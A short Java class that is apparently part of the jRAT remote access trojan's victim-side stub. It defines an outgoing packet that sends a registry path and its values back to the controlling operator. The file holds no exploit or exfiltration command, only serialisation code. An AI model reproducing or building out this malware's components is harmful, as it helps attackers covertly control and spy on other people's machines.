package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet54Registry extends AbstractOutgoingPacket {

	private String path;
	private String[] args;

	public Packet54Registry(String path, String[] args) {
		this.path = path;
		this.args = args;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(path);
		dos.writeInt(args.length);

		for (String arg : args) {
			sw.writeLine(arg);
		}
	}

	@Override
	public byte getPacketId() {
		return 54;
	}

}
